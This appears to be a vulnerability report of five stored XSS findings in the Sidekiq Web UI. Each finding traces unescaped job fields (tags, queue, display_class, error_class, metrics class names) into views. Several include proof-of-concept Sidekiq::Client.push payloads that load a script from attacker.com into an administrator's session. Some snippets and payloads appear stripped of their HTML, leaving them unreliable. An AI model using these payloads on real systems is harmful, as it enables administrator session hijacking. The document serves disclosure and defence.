title: Stored XSS in Web UI via Unescaped Job Tags in filter_link
analysis: ### Data Flow Analysis 1. **Source**: The untrusted input enters through job attributes, specifically the `tags` array on a job item. In Sidekiq, jobs can be tagged with arbitrary strings (e.g., tenant, user identifier, subdomain, or request metadata) via `sidekiq_options tags: [...]` or client enqueuing. In `lib/sidekiq/job_util.rb` line 15, `validate` only checks that `tags` is an `Array`: ```ruby raise(ArgumentError, "Job tags must be an Array: `#{item}`") if item["tags"] && !item["tags"].is_a?(Array) ``` No character validation or escaping is applied to individual tag strings. 2. **Sanitization/Validation Bypass**: In `lib/sidekiq/web/helpers.rb`, the `display_tags` helper maps each tag using `filter_link`: ```ruby def display_tags(job, within = "retries") job.tags.map { |tag| "#{filter_link(tag, within)}" }.join(" ") end def filter_link(jid, within = "retries") if within.nil? ::Rack::Utils.escape_html(jid) else "#{::Rack::Utils.escape_html(jid)}" end end ``` While the link's anchor text is escaped via `::Rack::Utils.escape_html(jid)`, the attribute value `href='#{root_path}filter/#{within}?substr=#{jid}'` interpolates the tag (`jid`) directly into single quotes with NO URL encoding and NO HTML escaping. 3. **Sink**: Views such as `web/views/retries.erb` (line 45), `web/views/scheduled.erb` (line 42), `web/views/morgue.erb` (line 43), and `web/views/_job_info.erb` (line 18) render `<%= display_tags(...) %>` directly without escaping, treating the returned string as raw HTML. When a single quote (`'`) is present in a tag, it breaks out of the `href` attribute and terminates the `` tag, allowing arbitrary HTML tags (e.g. `... ``` The browser executes `evil.js` in the administrator's session, enabling actions such as deleting queues, retrying/killing jobs, or exfiltrating data.
snippet: def filter_link(jid, within = "retries") if within.nil? ::Rack::Utils.escape_html(jid) else "#{::Rack::Utils.escape_html(jid)}" end end

title: Stored XSS in Web UI via Unescaped Queue Name in Views
analysis: ### Data Flow Analysis 1. **Source**: The untrusted input originates from the `queue` attribute of an enqueued job. Applications regularly specify or route jobs to dynamic queues based on user or tenant inputs (e.g., `Job.set(queue: tenant_queue).perform_async(...)`). In `lib/sidekiq/job_util.rb` line 50, validation only checks that `queue` is present: ```ruby raise(ArgumentError, "Job must include a valid queue name") if item["queue"].nil? || item["queue"] == "" ``` No regex or character-set restrictions are applied to queue names upon push or execution. 2. **Sanitization/Validation Bypass**: While the main queues index (`web/views/queues.erb` line 16) properly applies `CGI.escape` and `h` (`<%= h queue.name %>`), several other views throughout the Web UI render `queue` without any escaping or sanitization: - `web/views/scheduled.erb` line 38: ```erb <%= entry.queue %> ``` - `web/views/retries.erb` line 41: ```erb <%= entry.queue %> ``` - `web/views/morgue.erb` line 39: ```erb <%= entry.queue %> ``` - `web/views/_job_info.erb` line 11: ```erb <%= job.queue %> ``` - `web/views/busy.erb` line 135: ```erb <%= work.queue %> ``` - `web/views/busy.erb` line 76: ```erb <%= process.queues.sort.join(", ") %> ``` 3. **Sink**: ERB interpolation `<%= entry.queue %>` outputs the unsanitized queue string into both the `href` attribute and the link body. An attacker who can influence the queue name can break out of the HTML attribute and inject markup. 4. **CSP Bypass**: The Content Security Policy defined in `lib/sidekiq/web/application.rb` includes `script-src 'self' https: http:`, permitting scripts from any HTTPS host. ### Conceptual Exploit Payload A job is enqueued with a malicious queue name: ```ruby Sidekiq::Client.push( "class" => "ExampleJob", "args" => [1], "queue" => '">' ) ``` When an administrator browses `/scheduled`, `/retries`, `/morgue`, or `/busy`, the rendered HTML contains: ```html "> ``` The browser executes `evil.js` in the administrator's context.

title: Stored XSS in Web UI via Unescaped display_class in Views
analysis:
### Data Flow Analysis
1. **Source**: The untrusted input enters through job metadata, such as `display_class`, `wrapped`, `class`, or deserialized ActionMailer arguments in `JobRecord#display_class` (`lib/sidekiq/api.rb` lines 373-388):
   ```ruby
   def display_class
     @klass ||= self["display_class"] || begin
       if klass == "ActiveJob::QueueAdapters::SidekiqAdapter::JobWrapper"
         job_class = @item["wrapped"] || args[0]
         if job_class == "ActionMailer::DeliveryJob" || job_class == "ActionMailer::MailDeliveryJob"
           args[0]["arguments"][0..1].join("#")
         else
           job_class
         end
       else
         klass
       end
     end
   end
   ```
   No sanitization or character filtering is enforced on `display_class`, `wrapped`, or the mailer parameters.

2. **Sanitization/Validation Bypass**: While `web/views/queue.erb` line 28 explicitly sanitizes this field using `h` (`<%= h(job.display_class) %>`), several other views render `display_class` with completely unescaped ERB interpolation:
   - `web/views/retries.erb` line 44:
     ```erb
     <%= entry.display_class %>
     ```
   - `web/views/scheduled.erb` line 41:
     ```erb
     <%= entry.display_class %>
     ```
   - `web/views/morgue.erb` line 42:
     ```erb
     <%= entry.display_class %>
     ```
   - `web/views/_job_info.erb` line 17:
     ```erb
     <%= job.display_class %>
     ```
   - `web/views/busy.erb` line 138:
     ```erb
     <%= job.display_class %>
     ```

3. **Sink**: Raw ERB interpolation directly writes the string into table cells across multiple management pages. Any HTML or script tags are interpreted and rendered directly by the victim's browser.

4. **CSP Bypass**: Sidekiq's Content-Security-Policy includes `script-src 'self' https: http:`, permitting scripts loaded from external HTTPS hosts.

### Conceptual Exploit Payload
A job is enqueued with an HTML payload in `display_class` or `wrapped`:
```ruby
Sidekiq::Client.push(
  "class" => "ExampleJob",
  "display_class" => '<script src="https://attacker.com/evil.js"></script>',
  "args" => [1]
)
```
Or via an ActiveJob payload:
```ruby
Sidekiq::Client.push(
  "class" => "ActiveJob::QueueAdapters::SidekiqAdapter::JobWrapper",
  "wrapped" => '<script src="https://attacker.com/evil.js"></script>',
  "args" => []
)
```
When an administrator views `/retries`, `/scheduled`, `/morgue`, or `/busy`, the `<script>` tag is rendered without escaping, causing `evil.js` to execute in the administrator's authenticated session.

title: Stored XSS in Dead Job Detail View via Unescaped error_class
analysis: ### Data Flow Analysis 1. **Source**: The untrusted input enters via the `error_class` attribute of a dead job record stored in Redis (`DeadSet`). When a job fails and exhausts retries or is pushed to the morgue, the error information is recorded in the job hash. 2. **Sanitization/Validation Bypass**: On the individual retry view (`web/views/retry.erb` line 10), the error class is properly escaped using the `h` helper: ```erb <%= h @retry['error_class'] %> ``` However, on the individual dead job view (`web/views/dead.erb` lines 8-12), the developer omitted the `h` helper: ```erb <%= t('ErrorClass') %> <%= @dead['error_class'] %> ``` No HTML escaping is performed on `@dead['error_class']`. 3. **Sink**: The raw ERB tag `<%= @dead['error_class'] %>` inserts the unsanitized string directly inside the `` HTML element. 4. **CSP Bypass**: The Content-Security-Policy header permits script execution from any `https:` source (`script-src 'self' https: http:`). ### Conceptual Exploit Payload A job payload pushed to or killed into the dead set has its `error_class` set to an XSS payload: ```ruby Sidekiq::DeadSet.new.kill(Sidekiq.dump_json({ "class" => "ExampleJob", "args" => [], "jid" => "attacker123456", "error_class" => '', "error_message" => "An error occurred" })) ``` When an administrator views the dead job at `/morgue/-attacker123456`, the page renders: ```html ``` The browser executes `evil.js`, allowing the attacker to hijack the session.

title: Stored XSS in Metrics Overview View via Unescaped Job Class Name
analysis:
### Data Flow Analysis 1. **Source**: Job class names tracked by Sidekiq Metrics (`Sidekiq::Metrics::ExecutionTracker`), which records job executions in Redis keys like `j||` under hash field `|p`, `|f`, and `|ms`. Job class names can be defined dynamically or come from user-controlled jobs. 2. **Sanitization/Validation Bypass**: In `web/views/metrics.erb`: Lines 65-74: ```erb
<% id = "metrics-swatch-#{kls}" %> /> <%= kls %>
``` The variable `kls` (the job class name) is interpolated directly into `id`, `value`, `href`, and the link text without using the `h` escaping helper or `CGI.escape`. Additionally, in lines 37-47: ```erb <%= to_json({ series: job_results.map { |(kls, jr)| [kls, jr.dig("series", "s")] }.to_h, ... }) %> ``` `to_json` generates unescaped JSON (`JSON.generate`) directly inside a `` element. Because the `` tag accepts fallback HTML markup, closing tags like `', "args" => [] ) ``` When Sidekiq's ExecutionTracker records metrics for this job and an administrator navigates to `/metrics`, the overview table and `` block render: ```html ?period="> ``` The browser executes `evil.js`, compromising the administrator's session.
